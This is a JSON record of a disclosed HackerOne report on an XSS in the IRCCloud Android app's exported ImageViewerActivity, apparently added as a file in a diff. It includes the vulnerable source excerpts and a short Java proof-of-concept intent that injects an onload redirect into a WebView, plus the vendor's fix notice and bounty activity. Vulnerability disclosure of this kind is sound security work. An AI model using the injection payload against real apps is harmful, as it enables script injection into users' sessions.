@@ -1,0 +1,351 @@
+{
+  "id": 283063,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODMwNjM=",
+  "url": "https://hackerone.com/reports/283063",
+  "title": "[IRCCloud Android] XSS in ImageViewerActivity",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-10-26T12:18:33.011Z",
+  "submitted_at": "2017-10-26T12:18:33.011Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bagipro",
+    "url": "/bagipro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 140,
+    "url": "https://hackerone.com/irccloud",
+    "handle": "irccloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "IRCCloud",
+      "twitter_handle": "irccloud",
+      "website": "https://www.irccloud.com",
+      "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-03T11:36:13.948Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-26T17:14:48.752Z",
+  "team_member_agreed_on_going_public_at": "2017-11-03T11:36:13.852Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, I'd like to report HTML/JS injection in activity ```com.irccloud.android.activity.ImageViewerActivity``` which is exported:\n```xml\n        <activity android:configChanges=\"keyboardHidden|orientation|screenSize\" android:label=\"@string/title_activity_imageviewer\" android:name=\"com.irccloud.android.activity.ImageViewerActivity\" android:theme=\"@style/ImageViewerTheme\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/IMAGE_SCHEME\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/IMAGE_SCHEME_SECURE\"/>\n            </intent-filter>\n        </activity>\n```\nso can be launched by arbitrary apps installed on the same device. On the newest Androids could be exploited also by Android Instant Apps directly from a web-browser (installation is not required).\n\nFile ``` com/irccloud/android/activity/ImageViewerActivity.java  ```\n```java\n\n        } else if (getIntent() == null || getIntent().getDataString() == null) {\n            finish();\n        } else {\n            ImageList.getInstance().fetchImageInfo(getIntent().getDataString().replace(getResources().getString(R.string.IMAGE_SCHEME), \"http\"), new OnImageInfoListener() {\n                public void onImageInfo(ImageURLInfo info) {\n                    if (info == null) {\n                        ImageViewerActivity.this.fail();\n                    } else if (info.mp4 != null) {\n                        ImageViewerActivity.this.loadVideo(info.mp4);\n                    } else {\n                        ImageViewerActivity.this.loadImage(info.thumbnail); // by default\n                    }\n                }\n            });\n        }\n```\n\nHere we see that method ```ImageList.fetchImageInfo(..)``` is being loaded with attacker provided data.\nInside ``` ImageList ```:\n```java\n    public void fetchImageInfo(String URL, OnImageInfoListener listener) {\n        // ...\n        String url = URL;\n        // ...\n        ImageURLInfo info = new ImageURLInfo();\n        info.thumbnail = url;\n        info.original_url = URL;\n        putImageInfo(info);\n        listener.onImageInfo(info);\n```\nSo both ```info.thumbnail``` and ```info.original_url``` contains attacker provided data and this stuff is returned back to ```ImageViewerActivity``` where code is executed\n```java\nImageViewerActivity.this.loadImage(info.thumbnail);\n```\n\nInside this method attacker can inject arbitrary HTML/JS:\n```java\nprivate void loadImage(String urlStr) {\n        try {\n            // ...\n            this.mImage.loadDataWithBaseURL(null, \"<!DOCTYPE html>\\n<html><head><style>html, body, table { height: 100%; width: 100%; background-color: #000;}</style></head>\\n<body>\\n<table><tr><td><img src='\" + new URL(urlStr).toString() + \"' width='100%' onerror='Android.imageFailed()' onclick='Android.imageClicked()' style='background-color: #fff;'/>\\n</td></tr></table></body>\\n</html>\", \"text/html\", \"UTF-8\", null);\n```\n\nPoC of exploitation on Java:\n```java\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.ImageViewerActivity\");\n        intent.setData(Uri.parse(\"https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\\\"http://yahoo.com\\\"\"));\n        startActivity(intent);\n```\n\nResult:\n{F233010}\n{F233011}\n\nAPK is attached",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 233010,
+      "file_name": "2017-10-26_15-15-58.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/010/6f259ee38d609477cfc958a9dbd9b2ddbe712b32/2017-10-26_15-15-58.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_15-15-58.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_15-15-58.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075753Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c10aded40827959092354a6273bfc01758c1ae5e790b4b4c8ae1911a47859479",
+      "file_size": 34486,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 233011,
+      "file_name": "2017-10-26_15-15-26.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/011/146432005717c4cb5a03428bd861945404c89327/2017-10-26_15-15-26.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_15-15-26.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_15-15-26.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075753Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=09dc0aadbcfa07fcb3e5127705ad0b00a29eacd2de9cfd71d0e395a36e0aa1e9",
+      "file_size": 223467,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 233012,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/012/13b98903aec19680eb7ea94d784dcc3c4b7859cb/app-release.apk?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075753Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=38ffc8e93d34def3e530e1c8175648b92b02ce87e9b000b975799543bc8da0c5",
+      "file_size": 4668900,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-11-25T17:14:48.792Z",
+  "allow_singular_disclosure_after": -183825784.70859903,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "sheikhrishad0",
+    "alesandroortiz",
+    "michael1026",
+    "yogesh_ojha",
+    "cswiers",
+    "eveeez",
+    "msalihb",
+    "t4ym",
+    "b3nac",
+    "vraj",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 271,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.irccloud.android",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2105581,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks for this report. We've prevented this view from being exported and will be adding further escaping to protect against injection attacks.\nhttps://github.com/irccloud/android/commit/8ff145519bcd30da1898dd54a68629f53c62afe7",
+      "automated_response": false,
+      "created_at": "2017-10-26T15:23:50.494Z",
+      "updated_at": "2017-10-26T15:23:50.494Z",
+      "actor": {
+        "username": "jwheare",
+        "cleared": false,
+        "verified": false,
+        "url": "/jwheare",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "bagipro",
+        "url": "/bagipro"
+      },
+      "genius_execution_id": null,
+      "team_handle": "irccloud"
+    },
+    {
+      "id": 2105583,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2017-10-26T15:24:07.234Z",
+      "updated_at": "2017-10-26T15:24:07.234Z",
+      "actor": {
+        "url": "/irccloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "IRCCloud"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "irccloud",
+      "collaborator": {
+        "username": "bagipro",
+        "url": "/bagipro"
+      }
+    },
+    {
+      "id": 2105587,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2017-10-26T15:25:08.537Z",
+      "updated_at": "2017-10-26T15:25:08.537Z",
+      "actor": {
+        "url": "/irccloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "IRCCloud"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "irccloud",
+      "collaborator": {
+        "username": "bagipro",
+        "url": "/bagipro"
+      }
+    },
+    {
+      "id": 2105878,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Cool, thanks. Can we disclose?",
+      "automated_response": false,
+      "created_at": "2017-10-26T17:14:39.268Z",
+      "updated_at": "2017-10-26T17:14:39.268Z",
+      "actor": {
+        "username": "bagipro",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagipro",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "irccloud"
+    },
+    {
+      "id": 2105879,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2017-10-26T17:14:48.771Z",
+      "updated_at": "2017-10-26T17:14:48.771Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "bagipro",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagipro",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "irccloud"
+    },
+    {
+      "id": 2128849,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@jwheare Hi. Could you please agree to disclose it? I've found the same issue, and I need to give a reference",
+      "automated_response": false,
+      "created_at": "2017-11-02T18:36:50.513Z",
+      "updated_at": "2017-11-02T18:37:19.344Z",
+      "actor": {
+        "username": "bagipro",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagipro",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "irccloud"
+    },
+    {
+      "id": 2131169,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2017-11-03T11:36:13.883Z",
+      "updated_at": "2017-11-03T11:36:13.883Z",
+      "actor": {
+        "username": "jwheare",
+        "cleared": false,
+        "verified": false,
+        "url": "/jwheare",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "irccloud"
+    },
+    {
+      "id": 2131170,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2017-11-03T11:36:14.013Z",
+      "updated_at": "2017-11-03T11:36:14.013Z",
+      "actor": {
+        "username": "jwheare",
+        "cleared": false,
+        "verified": false,
+        "url": "/jwheare",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "irccloud"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
